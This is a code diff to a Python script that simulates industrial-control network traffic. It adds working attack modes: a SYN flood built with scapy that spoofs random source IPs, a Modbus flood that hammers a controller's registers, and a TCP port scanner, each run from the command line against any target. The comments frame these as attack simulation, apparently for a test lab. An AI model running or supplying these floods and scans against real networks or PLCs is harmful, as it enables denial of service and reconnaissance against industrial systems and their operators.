@@ -35,6 +35,14 @@ import socket
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
+# Scapy Imports for Attack Simulation
+try:
+    from scapy.all import IP, TCP, send, RandShort
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+    print("Warning: scapy not installed. SYN Flood mode will fail.")
+
 # Modbus Imports
 try:
     from pymodbus.server import StartTcpServer
@@ -50,6 +58,66 @@ except ImportError:
 # 配置日志
 logging.basicConfig(format='%(asctime)s [%(levelname)s] %(message)s', level=logging.INFO)
 log = logging.getLogger()
+
+# --- Attack Logic ---
+
+def run_syn_flood(target_ip, port, count=1000):
+    """运行 TCP SYN Flood 攻击"""
+    if not SCAPY_AVAILABLE:
+        log.error("[!] Scapy not available. Cannot run SYN Flood.")
+        return
+
+    log.info(f"[*] Starting SYN Flood -> {target_ip}:{port} (Count: {count})...")
+    
+    # 构造 SYN 包
+    # 源 IP 伪造为随机
+    for i in range(count):
+        src_ip = f"10.0.{random.randint(1,254)}.{random.randint(1,254)}"
+        ip = IP(src=src_ip, dst=target_ip)
+        tcp = TCP(sport=RandShort(), dport=port, flags="S", seq=random.randint(1000, 9000))
+        pkt = ip / tcp
+        send(pkt, verbose=0)
+        if i % 100 == 0:
+            log.info(f"[!] Sent {i} SYN packets...")
+            
+    log.info("[*] SYN Flood completed.")
+
+def run_modbus_flood(target_ip, port, count=1000):
+    """运行 Modbus 协议泛洪攻击 (应用层 DoS)"""
+    log.info(f"[*] Starting Modbus Flood -> {target_ip}:{port} (Count: {count})...")
+    client = ModbusTcpClient(target_ip, port=port)
+    
+    if not client.connect():
+        log.error(f"[!] Cannot connect to {target_ip}:{port}")
+        return
+
+    try:
+        for i in range(count):
+            # 快速发送读取请求，不等待间隔
+            client.read_holding_registers(0, count=10, device_id=1)
+            if i % 100 == 0:
+                log.info(f"[!] Sent {i} Modbus requests...")
+    except Exception as e:
+        log.error(f"[!] Flood error: {e}")
+    finally:
+        client.close()
+    log.info("[*] Modbus Flood completed.")
+
+def run_port_scan(target_ip, start_port=1, end_port=1024):
+    """运行简单的 TCP 端口扫描"""
+    log.info(f"[*] Starting Port Scan -> {target_ip} ({start_port}-{end_port})...")
+    
+    open_ports = []
+    for port in range(start_port, end_port + 1):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.1)
+        result = sock.connect_ex((target_ip, port))
+        if result == 0:
+            log.info(f"[+] Port {port} is OPEN")
+            open_ports.append(port)
+        sock.close()
+        
+    log.info(f"[*] Scan completed. Open ports: {open_ports}")
 
 # --- Modbus Logic ---
 def run_modbus_server(port):
@@ -188,6 +256,24 @@ if __name__ == "__main__":
     p_hc.add_argument("--port", type=int, default=8080)
     p_hc.add_argument("--interval", type=float, default=5.0)
 
+    # Attack: SYN Flood
+    p_syn = subparsers.add_parser("syn-flood")
+    p_syn.add_argument("--target", required=True)
+    p_syn.add_argument("--port", type=int, default=80)
+    p_syn.add_argument("--count", type=int, default=1000)
+
+    # Attack: Modbus Flood
+    p_mf = subparsers.add_parser("modbus-flood")
+    p_mf.add_argument("--target", required=True)
+    p_mf.add_argument("--port", type=int, default=5020)
+    p_mf.add_argument("--count", type=int, default=1000)
+
+    # Attack: Port Scan
+    p_ps = subparsers.add_parser("port-scan")
+    p_ps.add_argument("--target", required=True)
+    p_ps.add_argument("--start-port", type=int, default=1)
+    p_ps.add_argument("--end-port", type=int, default=100)
+
     args = parser.parse_args()
 
     if args.mode == "modbus-server":
@@ -202,21 +288,11 @@ if __name__ == "__main__":
         run_http_server(args.port)
     elif args.mode == "http-client":
         run_http_client(args.target, args.port, args.interval)
-    else:
-        parser.print_help()
-
-    
-    # Client parser
-    client_parser = subparsers.add_parser("client", help="运行 Modbus Client (模拟 HMI)")
-    client_parser.add_argument("--target", required=True, help="目标 PLC IP 地址")
-    client_parser.add_argument("--port", type=int, default=5020, help="目标端口 (默认: 5020)")
-    client_parser.add_argument("--interval", type=float, default=2.0, help="请求间隔秒数 (默认: 2.0)")
-    
-    args = parser.parse_args()
-    
-    if args.mode == "server":
-        run_server(args.port)
-    elif args.mode == "client":
-        run_client(args.target, args.port, args.interval)
+    elif args.mode == "syn-flood":
+        run_syn_flood(args.target, args.port, args.count)
+    elif args.mode == "modbus-flood":
+        run_modbus_flood(args.target, args.port, args.count)
+    elif args.mode == "port-scan":
+        run_port_scan(args.target, args.start_port, args.end_port)
     else:
         parser.print_help()
